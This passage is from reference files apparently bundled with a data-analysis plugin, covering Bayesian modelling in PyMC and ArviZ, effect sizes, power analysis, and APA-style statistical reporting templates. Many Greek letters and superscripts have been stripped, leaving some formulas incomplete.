95% of distribution\n- Always includes mode\n- Better for skewed distributions\n\n**Python calculation**:\n```python\nimport arviz as az\n\n# Equal-tailed interval\neti = np.percentile(posterior_samples, [2.5, 97.5])\n\n# HDI\nhdi = az.hdi(posterior_samples, hdi_prob=0.95)\n```\n\n---\n\n### Posterior Distributions\n\n**Interpreting posterior distributions**:\n\n1. **Central tendency**:\n   - Mean: Average posterior value\n   - Median: 50th percentile\n   - Mode: Most probable value (MAP - Maximum A Posteriori)\n\n2. **Uncertainty**:\n   - SD: Spread of posterior\n   - Credible intervals: Quantify uncertainty\n\n3. **Shape**:\n   - Symmetric: Similar to normal\n   - Skewed: Asymmetric uncertainty\n   - Multimodal: Multiple plausible values\n\n**Visualization**:\n```python\nimport matplotlib.pyplot as plt\nimport arviz as az\n\n# Posterior plot with HDI\naz.plot_posterior(trace, hdi_prob=0.95)\n\n# Trace plot (check convergence)\naz.plot_trace(trace)\n\n# Forest plot (multiple parameters)\naz.plot_forest(trace)\n```\n\n---\n\n## Common Bayesian Analyses\n\n### Bayesian T-Test\n\n**Purpose**: Compare two groups (Bayesian alternative to t-test)\n\n**Outputs**:\n1. Posterior distribution of mean difference\n2. 95% credible interval\n3. Bayes Factor (BF)\n4. Probability of directional hypothesis (e.g., P( > ))\n\n**Python implementation**:\n```python\nimport pymc as pm\nimport arviz as az\n\n# Bayesian independent samples t-test\nwith pm.Model() as model:\n    # Priors for group means\n    mu1 = pm.Normal('mu1', mu=0, sigma=10)\n    mu2 = pm.Normal('mu2', mu=0, sigma=10)\n\n    # Prior for pooled standard deviation\n    sigma = pm.HalfNormal('sigma', sigma=10)\n\n    # Likelihood\n    y1 = pm.Normal('y1', mu=mu1, sigma=sigma, observed=group1)\n    y2 = pm.Normal('y2', mu=mu2, sigma=sigma, observed=group2)\n\n    # Derived quantity: mean difference\n    diff = pm.Deterministic('diff', mu1 - mu2)\n\n    # Sample posterior\n    trace = pm.sample(2000, tune=1000, return_inferencedata=True)\n\n# Analyze results\nprint(az.summary(trace, var_names=['mu1', 'mu2', 'diff']))\n\n# Probability that group1 > group2\nprob_greater = np.mean(trace.posterior['diff'].values > 0)\nprint(f\"P( > ) = {prob_greater:.3f}\")\n\n# Plot posterior\naz.plot_posterior(trace, var_names=['diff'], ref_val=0)\n```\n\n---\n\n### Bayesian ANOVA\n\n**Purpose**: Compare three or more groups\n\n**Model**:\n```python\nimport pymc as pm\n\nwith pm.Model() as anova_model:\n    # Hyperpriors\n    mu_global = pm.Normal('mu_global', mu=0, sigma=10)\n    sigma_between = pm.HalfNormal('sigma_between', sigma=5)\n    sigma_within = pm.HalfNormal('sigma_within', sigma=5)\n\n    # Group means (hierarchical)\n    group_means = pm.Normal('group_means',\n                            mu=mu_global,\n                            sigma=sigma_between,\n                            shape=n_groups)\n\n    # Likelihood\n    y = pm.Normal('y',\n                  mu=group_means[group_idx],\n                  sigma=sigma_within,\n                  observed=data)\n\n    trace = pm.sample(2000, tune=1000, return_inferencedata=True)\n\n# Posterior contrasts\ncontrast_1_2 = trace.posterior['group_means'][:,:,0] - trace.posterior['group_means'][:,:,1]\n```\n\n---\n\n### Bayesian Correlation\n\n**Purpose**: Estimate correlation between two variables\n\n**Advantage**: Provides distribution of correlation values\n\n**Python implementation**:\n```python\nimport pymc as pm\n\nwith pm.Model() as corr_model:\n    # Prior on correlation\n    rho = pm.Uniform('rho', lower=-1, upper=1)\n\n    # Convert to covariance matrix\n    cov_matrix = pm.math.stack([[1, rho],\n                                [rho, 1]])\n\n    # Likelihood (bivariate normal)\n    obs = pm.MvNormal('obs',\n                     mu=[0, 0],\n                     cov=cov_matrix,\n                     observed=np.column_stack([x, y]))\n\n    trace = pm.sample(2000, tune=1000, return_inferencedata=True)\n\n# Summarize correlation\nprint(az.summary(trace, var_names=['rho']))\n\n# Probability that correlation is positive\nprob_positive = np.mean(trace.posterior['rho'].values > 0)\n```\n\n---\n\n### Bayesian Linear Regression\n\n**Purpose**: Model relationship between predictors and outcome\n\n**Advantages**:\n- Uncertainty in all parameters\n- Natural regularization (via priors)\n- Can incorporate prior knowledge\n- Credible intervals for predictions\n\n**Python implementation**:\n```python\nimport pymc as pm\n\nwith pm.Model() as regression_model:\n    # Priors for coefficients\n    alpha = pm.Normal('alpha', mu=0, sigma=10)  # Intercept\n    beta = pm.Normal('beta', mu=0, sigma=10, shape=n_predictors)\n    sigma = pm.HalfNormal('sigma', sigma=10)\n\n    # Expected value\n    mu = alpha + pm.math.dot(X, beta)\n\n    # Likelihood\n    y_obs = pm.Normal('y_obs', mu=mu, sigma=sigma, observed=y)\n\n    trace = pm.sample(2000, tune=1000, return_inferencedata=True)\n\n# Posterior predictive checks\nwith regression_model:\n    ppc = pm.sample_posterior_predictive(trace)\n\naz.plot_ppc(ppc)\n\n# Predictions with uncertainty\nwith regression_model:\n    pm.set_data({'X': X_new})\n    posterior_pred = pm.sample_posterior_predictive(trace)\n```\n\n---\n\n## Hierarchical (Multilevel) Models\n\n**When to use**:\n- Nested/clustered data (students within schools)\n- Repeated measures\n- Meta-analysis\n- Varying effects across groups\n\n**Key concept**: Partial pooling\n- Complete pooling: Ignore groups (biased)\n- No pooling: Analyze groups separately (high variance)\n- Partial pooling: Borrow strength across groups (Bayesian)\n\n**Example: Varying intercepts**:\n```python\nwith pm.Model() as hierarchical_model:\n    # Hyperpriors\n    mu_global = pm.Normal('mu_global', mu=0, sigma=10)\n    sigma_between = pm.HalfNormal('sigma_between', sigma=5)\n    sigma_within = pm.HalfNormal('sigma_within', sigma=5)\n\n    # Group-level intercepts\n    alpha = pm.Normal('alpha',\n                     mu=mu_global,\n                     sigma=sigma_between,\n                     shape=n_groups)\n\n    # Likelihood\n    y_obs = pm.Normal('y_obs',\n                     mu=alpha[group_idx],\n                     sigma=sigma_within,\n                     observed=y)\n\n    trace = pm.sample()\n```\n\n---\n\n## Model Comparison\n\n### Methods\n\n#### 1. Bayes Factor\n- Directly compares model evidence\n- Sensitive to prior specification\n- Can be computationally intensive\n\n#### 2. Information Criteria\n\n**WAIC (Widely Applicable Information Criterion)**:\n- Bayesian analog of AIC\n- Lower is better\n- Accounts for effective number of parameters\n\n**LOO (Leave-One-Out Cross-Validation)**:\n- Estimates out-of-sample prediction error\n- Lower is better\n- More robust than WAIC\n\n**Python calculation**:\n```python\nimport arviz as az\n\n# Calculate WAIC and LOO\nwaic = az.waic(trace)\nloo = az.loo(trace)\n\nprint(f\"WAIC: {waic.elpd_waic:.2f}\")\nprint(f\"LOO: {loo.elpd_loo:.2f}\")\n\n# Compare multiple models\ncomparison = az.compare({\n    'model1': trace1,\n    'model2': trace2,\n    'model3': trace3\n})\nprint(comparison)\n```\n\n---\n\n## Checking Bayesian Models\n\n### 1. Convergence Diagnostics\n\n**R-hat (Gelman-Rubin statistic)**:\n- Compares within-chain and between-chain variance\n- Values close to 1.0 indicate convergence\n- R-hat < 1.01: Good\n- R-hat > 1.05: Poor convergence\n\n**Effective Sample Size (ESS)**:\n- Number of independent samples\n- Higher is better\n- ESS > 400 per chain recommended\n\n**Trace plots**:\n- Should look like \"fuzzy caterpillar\"\n- No trends, no stuck chains\n\n**Python checking**:\n```python\n# Automatic summary with diagnostics\nprint(az.summary(trace, var_names=['parameter']))\n\n# Visual diagnostics\naz.plot_trace(trace)\naz.plot_rank(trace)  # Rank plots\n```\n\n---\n\n### 2. Posterior Predictive Checks\n\n**Purpose**: Does model generate data similar to observed data?\n\n**Process**:\n1. Generate predictions from posterior\n2. Compare to actual data\n3. Look for systematic discrepancies\n\n**Python implementation**:\n```python\nwith model:\n    ppc = pm.sample_posterior_predictive(trace)\n\n# Visual check\naz.plot_ppc(ppc, num_pp_samples=100)\n\n# Quantitative checks\nobs_mean = np.mean(observed_data)\npred_means = [np.mean(sample) for sample in ppc.posterior_predictive['y_obs']]\np_value = np.mean(pred_means >= obs_mean)  # Bayesian p-value\n```\n\n---\n\n## Reporting Bayesian Results\n\n### Example T-Test Report\n\n> \"A Bayesian independent samples t-test was conducted to compare groups A and B. Weakly informative priors were used: Normal(0, 1) for the mean difference and Half-Cauchy(0, 1) for the pooled standard deviation. The posterior distribution of the mean difference had a mean of 5.2 (95% CI [2.3, 8.1]), indicating that Group A scored higher than Group B. The Bayes Factor BF = 23.5 provided strong evidence for a difference between groups, and there was a 99.7% probability that Group A's mean exceeded Group B's mean.\"\n\n### Example Regression Report\n\n> \"A Bayesian linear regression was fitted with weakly informative priors (Normal(0, 10) for coefficients, Half-Cauchy(0, 5) for residual SD). The model explained substantial variance (R = 0.47, 95% CI [0.38, 0.55]). Study hours ( = 0.52, 95% CI [0.38, 0.66]) and prior GPA ( = 0.31, 95% CI [0.17, 0.45]) were credible predictors (95% CIs excluded zero). Posterior predictive checks showed good model fit. Convergence diagnostics were satisfactory (all R-hat < 1.01, ESS > 1000).\"\n\n---\n\n## Advantages and Limitations\n\n### Advantages\n\n1. **Intuitive interpretation**: Direct probability statements about parameters\n2. **Incorporates prior knowledge**: Uses all available information\n3. **Flexible**: Handles complex models easily\n4. **No p-hacking**: Can look at data as it arrives\n5. **Quantifies uncertainty**: Full posterior distribution\n6. **Small samples**: Works with any sample size\n\n### Limitations\n\n1. **Computational**: Requires MCMC sampling (can be slow)\n2. **Prior specification**: Requires thought and justification\n3. **Complexity**: Steeper learning curve\n4. **Software**: Fewer tools than frequentist methods\n5. **Communication**: May need to educate reviewers/readers\n\n---\n\n## Key Python Packages\n\n- **PyMC**: Full Bayesian modeling framework\n- **ArviZ**: Visualization and diagnostics\n- **Bambi**: High-level interface for regression models\n- **PyStan**: Python interface to Stan\n- **TensorFlow Probability**: Bayesian inference with TensorFlow\n\n---\n\n## When to Use Bayesian Methods\n\n**Use Bayesian when**:\n- You have prior information to incorporate\n- You want direct probability statements\n- Sample size is small\n- Model is complex (hierarchical, missing data, etc.)\n- You want to update analysis as data arrives\n\n**Frequentist may be sufficient when**:\n- Standard analysis with large sample\n- No prior information\n- Computational resources limited\n- Reviewers unfamiliar with Bayesian methods\n",
        "plugins/sys-research/skills/analyzing-data/references/effect_sizes_and_power.md": "# Effect Sizes and Power Analysis\n\nThis document provides guidance on calculating, interpreting, and reporting effect sizes, as well as conducting power analyses for study planning.\n\n## Why Effect Sizes Matter\n\n1. **Statistical significance  practical significance**: p-values only tell if an effect exists, not how large it is\n2. **Sample size dependent**: With large samples, trivial effects become \"significant\"\n3. **Interpretation**: Effect sizes provide magnitude and practical importance\n4. **Meta-analysis**: Effect sizes enable combining results across studies\n5. **Power analysis**: Required for sample size determination\n\n**Golden rule**: ALWAYS report effect sizes alongside p-values.\n\n---\n\n## Effect Sizes by Analysis Type\n\n### T-Tests and Mean Differences\n\n#### Cohen's d (Standardized Mean Difference)\n\n**Formula**:\n- Independent groups: d = (M - M) / SD_pooled\n- Paired groups: d = M_diff / SD_diff\n\n**Interpretation** (Cohen, 1988):\n- Small: |d| = 0.20\n- Medium: |d| = 0.50\n- Large: |d| = 0.80\n\n**Context-dependent interpretation**:\n- In education: d = 0.40 is typical for successful interventions\n- In psychology: d = 0.40 is considered meaningful\n- In medicine: Small effect sizes can be clinically important\n\n**Python calculation**:\n```python\nimport pingouin as pg\nimport numpy as np\n\n# Independent t-test with effect size\nresult = pg.ttest(group1, group2, correction=False)\ncohens_d = result['cohen-d'].values[0]\n\n# Manual calculation\nmean_diff = np.mean(group1) - np.mean(group2)\npooled_std = np.sqrt((np.var(group1, ddof=1) + np.var(group2, ddof=1)) / 2)\ncohens_d = mean_diff / pooled_std\n\n# Paired t-test\nresult = pg.ttest(pre, post, paired=True)\ncohens_d = result['cohen-d'].values[0]\n```\n\n**Confidence intervals for d**:\n```python\nfrom pingouin import compute_effsize_from_t\n\nd, ci = compute_effsize_from_t(t_statistic, nx=n1, ny=n2, eftype='cohen')\n```\n\n---\n\n#### Hedges' g (Bias-Corrected d)\n\n**Why use it**: Cohen's d has slight upward bias with small samples (n < 20)\n\n**Formula**: g = d  correction_factor, where correction_factor = 1 - 3/(4df - 1)\n\n**Python calculation**:\n```python\nresult = pg.ttest(group1, group2, correction=False)\nhedges_g = result['hedges'].values[0]\n```\n\n**Use Hedges' g when**:\n- Sample sizes are small (n < 20 per group)\n- Conducting meta-analyses (standard in meta-analysis)\n\n---\n\n#### Glass's  (Delta)\n\n**When to use**: When one group is a control with known variability\n\n**Formula**:  = (M - M) / SD_control\n\n**Use cases**:\n- Clinical trials (use control group SD)\n- When treatment affects variability\n\n---\n\n### ANOVA\n\n#### Eta-squared ()\n\n**What it measures**: Proportion of total variance explained by factor\n\n**Formula**:  = SS_effect / SS_total\n\n**Interpretation**:\n- Small:  = 0.01 (1% of variance)\n- Medium:  = 0.06 (6% of variance)\n- Large:  = 0.14 (14% of variance)\n\n**Limitation**: Biased with multiple factors (sums to > 1.0)\n\n**Python calculation**:\n```python\nimport pingouin as pg\n\n# One-way ANOVA\naov = pg.anova(dv='value', between='group', data=df)\neta_squared = aov['SS'][0] / aov['SS'].sum()\n\n# Or use pingouin directly\naov = pg.anova(dv='value', between='group', data=df, detailed=True)\neta_squared = aov['np2'][0]  # Note: pingouin reports partial eta-squared\n```\n\n---\n\n#### Partial Eta-squared (_p)\n\n**What it measures**: Proportion of variance explained by factor, excluding other factors\n\n**Formula**: _p = SS_effect / (SS_effect + SS_error)\n\n**Interpretation**: Same benchmarks as \n\n**When to use**: Multi-factor ANOVA (standard in factorial designs)\n\n**Python calculation**:\n```python\naov = pg.anova(dv='value', between=['factor1', 'factor2'], data=df)\n# pingouin reports partial eta-squared by default\npartial_eta_sq = aov['np2']\n```\n\n---\n\n#### Omega-squared ()\n\n**What it measures**: Less biased estimate of population variance explained\n\n**Why use it**:  overestimates effect size;  provides better population estimate\n\n**Formula**:  = (SS_effect - df_effect  MS_error) / (SS_total + MS_error)\n\n**Interpretation**: Same benchmarks as , but typically smaller values\n\n**Python calculation**:\n```python\ndef omega_squared(aov_table):\n    ss_effect = aov_table.loc[0, 'SS']\n    ss_total = aov_table['SS'].sum()\n    ms_error = aov_table.loc[aov_table.index[-1], 'MS']  # Residual MS\n    df_effect = aov_table.loc[0, 'DF']\n\n    omega_sq = (ss_effect - df_effect * ms_error) / (ss_total + ms_error)\n    return omega_sq\n```\n\n---\n\n#### Cohen's f\n\n**What it measures**: Effect size for ANOVA (analogous to Cohen's d)\n\n**Formula**: f = ( / (1 - ))\n\n**Interpretation**:\n- Small: f = 0.10\n- Medium: f = 0.25\n- Large: f = 0.40\n\n**Python calculation**:\n```python\neta_squared = 0.06  # From ANOVA\ncohens_f = np.sqrt(eta_squared / (1 - eta_squared))\n```\n\n**Use in power analysis**: Required for ANOVA power calculations\n\n---\n\n### Correlation\n\n#### Pearson's r / Spearman's \n\n**Interpretation**:\n- Small: |r| = 0.10\n- Medium: |r| = 0.30\n- Large: |r| = 0.50\n\n**Important notes**:\n- r = coefficient of determination (proportion of variance explained)\n- r = 0.30 means 9% shared variance (0.30 = 0.09)\n- Consider direction (positive/negative) and context\n\n**Python calculation**:\n```python\nimport pingouin as pg\n\n# Pearson correlation with CI\nresult = pg.corr(x, y, method='pearson')\nr = result['r'].values[0]\nci = [result['CI95%'][0][0], result['CI95%'][0][1]]\n\n# Spearman correlation\nresult = pg.corr(x, y, method='spearman')\nrho = result['r'].values[0]\n```\n\n---\n\n### Regression\n\n#### R (Coefficient of Determination)\n\n**What it measures**: Proportion of variance in Y explained by model\n\n**Interpretation**:\n- Small: R = 0.02\n- Medium: R = 0.13\n- Large: R = 0.26\n\n**Context-dependent**:\n- Physical sciences: R > 0.90 expected\n- Social sciences: R > 0.30 considered good\n- Behavior prediction: R > 0.10 may be meaningful\n\n**Python calculation**:\n```python\nfrom sklearn.metrics import r2_score\nfrom statsmodels.api import OLS\n\n# Using statsmodels\nmodel = OLS(y, X).fit()\nr_squared = model.rsquared\nadjusted_r_squared = model.rsquared_adj\n\n# Manual\nr_squared = 1 - (SS_residual / SS_total)\n```\n\n---\n\n#### Adjusted R\n\n**Why use it**: R artificially increases when adding predictors; adjusted R penalizes model complexity\n\n**Formula**: R_adj = 1 - (1 - R)  (n - 1) / (n - k - 1)\n\n**When to use**: Always report alongside R for multiple regression\n\n---\n\n#### Standardized Regression Coefficients ()\n\n**What it measures**: Effect of one-SD change in predictor on outcome (in SD units)\n\n**Interpretation**: Similar to Cohen's d\n- Small: || = 0.10\n- Medium: || = 0.30\n- Large: || = 0.50\n\n**Python calculation**:\n```python\nfrom scipy import stats\n\n# Standardize variables first\nX_std = (X - X.mean()) / X.std()\ny_std = (y - y.mean()) / y.std()\n\nmodel = OLS(y_std, X_std).fit()\nbeta = model.params\n```\n\n---\n\n#### f (Cohen's f-squared for Regression)\n\n**What it measures**: Effect size for individual predictors or model comparison\n\n**Formula**: f = R_AB - R_A / (1 - R_AB)\n\nWhere:\n- R_AB = R for full model with predictor\n- R_A = R for reduced model without predictor\n\n**Interpretation**:\n- Small: f = 0.02\n- Medium: f = 0.15\n- Large: f = 0.35\n\n**Python calculation**:\n```python\n# Compare two nested models\nmodel_full = OLS(y, X_full).fit()\nmodel_reduced = OLS(y, X_reduced).fit()\n\nr2_full = model_full.rsquared\nr2_reduced = model_reduced.rsquared\n\nf_squared = (r2_full - r2_reduced) / (1 - r2_full)\n```\n\n---\n\n### Categorical Data Analysis\n\n#### Cramr's V\n\n**What it measures**: Association strength for  test (works for any table size)\n\n**Formula**: V = ( / (n  (k - 1)))\n\nWhere k = min(rows, columns)\n\n**Interpretation** (for k > 2):\n- Small: V = 0.07\n- Medium: V = 0.21\n- Large: V = 0.35\n\n**For 22 tables**: Use phi coefficient ()\n\n**Python calculation**:\n```python\nfrom scipy.stats.contingency import association\n\n# Cramr's V\ncramers_v = association(contingency_table, method='cramer')\n\n# Phi coefficient (for 2x2)\nphi = association(contingency_table, method='pearson')\n```\n\n---\n\n#### Odds Ratio (OR) and Risk Ratio (RR)\n\n**For 22 contingency tables**:\n\n|           | Outcome + | Outcome - |\n|-----------|-----------|-----------|\n| Exposed   | a         | b         |\n| Unexposed | c         | d         |\n\n**Odds Ratio**: OR = (a/b) / (c/d) = ad / bc\n\n**Interpretation**:\n- OR = 1: No association\n- OR > 1: Positive association (increased odds)\n- OR < 1: Negative association (decreased odds)\n- OR = 2: Twice the odds\n- OR = 0.5: Half the odds\n\n**Risk Ratio**: RR = (a/(a+b)) / (c/(c+d))\n\n**When to use**:\n- Cohort studies: Use RR (more interpretable)\n- Case-control studies: Use OR (RR not available)\n- Logistic regression: OR is natural output\n\n**Python calculation**:\n```python\nimport statsmodels.api as sm\n\n# From contingency table\nodds_ratio = (a * d) / (b * c)\n\n# Confidence interval\ntable = np.array([[a, b], [c, d]])\noddsratio, pvalue = stats.fisher_exact(table)\n\n# From logistic regression\nmodel = sm.Logit(y, X).fit()\nodds_ratios = np.exp(model.params)  # Exponentiate coefficients\nci = np.exp(model.conf_int())  # Exponentiate CIs\n```\n\n---\n\n### Bayesian Effect Sizes\n\n#### Bayes Factor (BF)\n\n**What it measures**: Ratio of evidence for alternative vs. null hypothesis\n\n**Interpretation**:\n- BF = 1: Equal evidence for H and H\n- BF = 3: H is 3 more likely than H (moderate evidence)\n- BF = 10: H is 10 more likely than H (strong evidence)\n- BF = 100: H is 100 more likely than H (decisive evidence)\n- BF = 0.33: H is 3 more likely than H\n- BF = 0.10: H is 10 more likely than H\n\n**Classification** (Jeffreys, 1961):\n- 1-3: Anecdotal evidence\n- 3-10: Moderate evidence\n- 10-30: Strong evidence\n- 30-100: Very strong evidence\n- >100: Decisive evidence\n\n**Python calculation**:\n```python\nimport pingouin as pg\n\n# Bayesian t-test\nresult = pg.ttest(group1, group2, correction=False)\n# Note: pingouin doesn't include BF; use other packages\n\n# Using JASP or BayesFactor (R) via rpy2\n# Or implement using numerical integration\n```\n\n---\n\n## Power Analysis\n\n### Concepts\n\n**Statistical power**: Probability of detecting an effect if it exists (1 - )\n\n**Conventional standards**:\n- Power = 0.80 (80% chance of detecting effect)\n-  = 0.05 (5% Type I error rate)\n\n**Four interconnected parameters** (given 3, can solve for 4th):\n1. Sample size (n)\n2. Effect size (d, f, etc.)\n3. Significance level ()\n4. Power (1 - )\n\n---\n\n### A Priori Power Analysis (Planning)\n\n**Purpose**: Determine required sample size before study\n\n**Steps**:\n1. Specify expected effect size (from literature, pilot data, or minimum meaningful effect)\n2. Set  level (typically 0.05)\n3. Set desired power (typically 0.80)\n4. Calculate required n\n\n**Python implementation**:\n```python\nfrom statsmodels.stats.power import (\n    tt_ind_solve_power,\n    zt_ind_solve_power,\n    FTestAnovaPower,\n    NormalIndPower\n)\n\n# T-test power analysis\nn_required = tt_ind_solve_power(\n    effect_size=0.5,  # Cohen's d\n    alpha=0.05,\n    power=0.80,\n    ratio=1.0,  # Equal group sizes\n    alternative='two-sided'\n)\n\n# ANOVA power analysis\nanova_power = FTestAnovaPower()\nn_per_group = anova_power.solve_power(\n    effect_size=0.25,  # Cohen's f\n    ngroups=3,\n    alpha=0.05,\n    power=0.80\n)\n\n# Correlation power analysis\nfrom pingouin import power_corr\nn_required = power_corr(r=0.30, power=0.80, alpha=0.05)\n```\n\n---\n\n### Post Hoc Power Analysis (After Study)\n\n**WARNING CAUTION**: Post hoc power is controversial and often not recommended\n\n**Why it's problematic**:\n- Observed power is a direct function of p-value\n- If p > 0.05, power is always low\n- Provides no additional information beyond p-value\n- Can be misleading\n\n**When it might be acceptable**:\n- Study planning for future research\n- Using effect size from multiple studies (not just your own)\n- Explicit goal is sample size for replication\n\n**Better alternatives**:\n- Report confidence intervals for effect sizes\n- Conduct sensitivity analysis\n- Report minimum detectable effect size\n\n---\n\n### Sensitivity Analysis\n\n**Purpose**: Determine minimum detectable effect size given study parameters\n\n**When to use**: After study is complete, to understand study's capability\n\n**Python implementation**:\n```python\n# What effect size could we detect with n=50 per group?\ndetectable_effect = tt_ind_solve_power(\n    effect_size=None,  # Solve for this\n    nobs1=50,\n    alpha=0.05,\n    power=0.80,\n    ratio=1.0,\n    alternative='two-sided'\n)\n\nprint(f\"With n=50 per group, we could detect d  {detectable_effect:.2f}\")\n```\n\n---\n\n## Reporting Effect Sizes\n\n### APA Style Guidelines\n\n**T-test example**:\n> \"Group A (M = 75.2, SD = 8.5) scored significantly higher than Group B (M = 68.3, SD = 9.2), t(98) = 3.82, p < .001, d = 0.77, 95% CI [0.36, 1.18].\"\n\n**ANOVA example**:\n> \"There was a significant main effect of treatment condition on test scores, F(2, 87) = 8.45, p < .001, p = .16. Post hoc comparisons using Tukey's HSD revealed...\"\n\n**Correlation example**:\n> \"There was a moderate positive correlation between study time and exam scores, r(148) = .42, p < .001, 95% CI [.27, .55].\"\n\n**Regression example**:\n> \"The regression model significantly predicted exam scores, F(3, 146) = 45.2, p < .001, R = .48. Study hours ( = .52, p < .001) and prior GPA ( = .31, p < .001) were significant predictors.\"\n\n**Bayesian example**:\n> \"A Bayesian independent samples t-test provided strong evidence for a difference between groups, BF = 23.5, indicating the data are 23.5 times more likely under H than H.\"\n\n---\n\n## Effect Size Pitfalls\n\n1. **Don't only rely on benchmarks**: Context matters; small effects can be meaningful\n2. **Report confidence intervals**: CIs show precision of effect size estimate\n3. **Distinguish statistical vs. practical significance**: Large n can make trivial effects \"significant\"\n4. **Consider cost-benefit**: Even small effects may be valuable if intervention is low-cost\n5. **Multiple outcomes**: Effect sizes vary across outcomes; report all\n6. **Don't cherry-pick**: Report effects for all planned analyses\n7. **Publication bias**: Published effects are often overestimated\n\n---\n\n## Quick Reference Table\n\n| Analysis | Effect Size | Small | Medium | Large |\n|----------|-------------|-------|--------|-------|\n| T-test | Cohen's d | 0.20 | 0.50 | 0.80 |\n| ANOVA | ,  | 0.01 | 0.06 | 0.14 |\n| ANOVA | Cohen's f | 0.10 | 0.25 | 0.40 |\n| Correlation | r,  | 0.10 | 0.30 | 0.50 |\n| Regression | R | 0.02 | 0.13 | 0.26 |\n| Regression | f | 0.02 | 0.15 | 0.35 |\n| Chi-square | Cramr's V | 0.07 | 0.21 | 0.35 |\n| Chi-square (22) |  | 0.10 | 0.30 | 0.50 |\n\n---\n\n## Resources\n\n- Cohen, J. (1988). *Statistical Power Analysis for the Behavioral Sciences* (2nd ed.)\n- Lakens, D. (2013). Calculating and reporting effect sizes\n- Ellis, P. D. (2010). *The Essential Guide to Effect Sizes*\n",
        "plugins/sys-research/skills/analyzing-data/references/report-templates.md": "# Example Report Templates\n\n## Independent T-Test\n\n```\nGroup A (n = 48, M = 75.2, SD = 8.5) scored significantly higher than\nGroup B (n = 52, M = 68.3, SD = 9.2), t(98) = 3.82, p < .001, d = 0.77,\n95% CI [0.36, 1.18], two-tailed. Assumptions of normality (Shapiro-Wilk:\nGroup A W = 0.97, p = .18; Group B W = 0.96, p = .12) and homogeneity\nof variance (Levene's F(1, 98) = 1.23, p = .27) were satisfied.\n```\n\n## One-Way ANOVA\n\n```\nA one-way ANOVA revealed a significant main effect of treatment condition\non test scores, F(2, 147) = 8.45, p < .001, _p = .10. Post hoc\ncomparisons using Tukey's HSD indicated that Condition A (M = 78.2,\nSD = 7.3) scored significantly higher than Condition B (M = 71.5,\nSD = 8.1, p = .002, d = 0.87) and Condition C (M = 70.1, SD = 7.9,\np < .001, d = 1.07). Conditions B and C did not differ significantly\n(p = .52, d = 0.18).\n```\n\n## Multiple Regression\n\n```\nMultiple linear regression was conducted to predict exam scores from\nstudy hours, prior GPA, and attendance. The overall model was significant,\nF(3, 146) = 45.2, p < .001, R = .48, adjusted R = .47. Study hours\n(B = 1.80, SE = 0.31,  = .35, t = 5.78, p < .001, 95% CI [1.18, 2.42])\nand prior GPA (B = 8.52, SE = 1.95,  = .28, t = 4.37, p < .001,\n95% CI [4.66, 12.38]) were significant predictors, while attendance was\nnot (B = 0.15, SE = 0.12,  = .08, t = 1.25, p = .21, 95% CI [-0.09, 0.39]).\nMulticollinearity was not a concern (all VIF < 1.5).\n```\n\n## Bayesian Analysis\n\n```\nA Bayesian independent samples t-test was conducted using weakly\ninformative priors (Normal(0, 1) for mean difference). The posterior\ndistribution indicated that Group A scored higher than Group B\n(M_diff = 6.8, 95% credible interval [3.2, 10.4]). The Bayes Factor\nBF = 45.3 provided very strong evidence for a difference between\ngroups, with a 99.8% posterior probability that Group A's mean exceeded\nGroup B's mean. Convergence diagnostics were satisfactory (all R < 1.01,\nESS > 1000).\n```\n",
        "plugins/sys-research/skills/analyzing-data/references/reporting_standards.md": "# Statistical Reporting Standards\n\nThis document provides guidelines for reporting statistical analyses according to APA (American Psychological Association) style and general best practices for academic publications.\n\n## General Principles\n\n1. **Transparency**: Report enough detail for replication\n2. **Completeness**: Include all planned analyses and outcomes\n3. **Honesty**: Report non-significant findings and violations\n4. **Clarity**: Write for your audience, define technical terms\n5. **Reproducibility**: Provide code, data, or supplements when possible\n\n---\n\n## Pre-Registration and Planning\n\n### What to Report (Ideally Before Data Collection)\n\n1. **Hypotheses**: Clearly stated, directional when appropriate\n2. **Sample size justification**: Power analysis or other rationale\n3. **Data collection stopping rule**: When will you stop collecting data?\n4. **Variables**: All variables collected (not just those analyzed)\n5. **Exclusion criteria**: Rules for excluding participants/data points\n6. **Statistical analyses**: Planned tests, including:\n   - Primary analysis\n   - Secondary analyses\n   - Exploratory analyses (labeled as such)\n   - Handling of missing data\n   - Multiple comparison corrections\n   - Assumption checks\n\n**Why pre-register?**\n- Prevents HARKing (Hypothesizing After Results are Known)\n- Distinguishes confirmatory from exploratory analyses\n- Increases credibility and reproducibility\n\n**Platforms**: OSF, AsPredicted, ClinicalTrials.gov\n\n---\n\n## Methods Section\n\n### Participants\n\n**What to report**:\n- Total N, including excluded participants\n- Relevant demographics (age, gender, etc.)\n- Recruitment method\n- Inclusion/exclusion criteria\n- Attrition/dropout with reasons\n\n**Example**:\n> \"Participants were 150 undergraduate students (98 female, 52 male; M_age = 19.4 years, SD = 1.2, range 18-24) recruited from psychology courses in exchange for course credit. Five participants were excluded due to incomplete data (n = 3) or failing attention checks (n = 2), resulting in a final sample of 145.\"\n\n### Design\n\n**What to report**:\n- Study design (between-subjects, within-subjects, mixed)\n- Independent variables and levels\n- Dependent variables\n- Control variables/covariates\n- Randomization procedure\n- Blinding (single-blind, double-blind)\n\n**Example**:\n> \"A 2 (feedback: positive vs. negative)  2 (timing: immediate vs. delayed) between-subjects factorial design was used. Participants were randomly assigned to conditions using a computer-generated randomization sequence. The primary outcome was task performance measured as number of correct responses (0-20 scale).\"\n\n### Measures\n\n**What to report**:\n- Full name of measure/instrument\n- Number of items\n- Scale/response format\n- Scoring method\n- Reliability (Cronbach's , ICC, etc.)\n- Validity evidence (if applicable)\n\n**Example**:\n> \"Depression was assessed using the Beck Depression Inventory-II (BDI-II; Beck et al., 1996), a 21-item self-report measure rated on a 4-point scale (0-3). Total scores range from 0 to 63, with higher scores indicating greater depression severity. The BDI-II demonstrated excellent internal consistency in this sample ( = .91).\"\n\n### Procedure\n\n**What to report**:\n- Step-by-step description of what participants did\n- Timing and duration\n- Instructions given\n- Any manipulations or interventions\n\n**Example**:\n> \"Participants completed the study online via Qualtrics. After providing informed consent, they completed demographic questions, were randomly assigned to one of four conditions, completed the experimental task (approximately 15 minutes), and finished with the outcome measures and debriefing. The entire session lasted approximately 30 minutes.\"\n\n### Data Analysis\n\n**What to report**:\n- Software used (with version)\n- Significance level ()\n- Tail(s) of tests (one-tailed or two-tailed)\n- Assumption checks conducted\n- Missing data handling\n- Outlier treatment\n- Multiple comparison corrections\n- Effect size measures used\n\n**Example**:\n> \"All analyses were conducted using Python 3.10 with scipy 1.11 and statsmodels 0.14. An alpha level of .05 was used for all significance tests. Assumptions of normality and homogeneity of variance were assessed using Shapiro-Wilk and Levene's tests, respectively. Missing data (< 2% 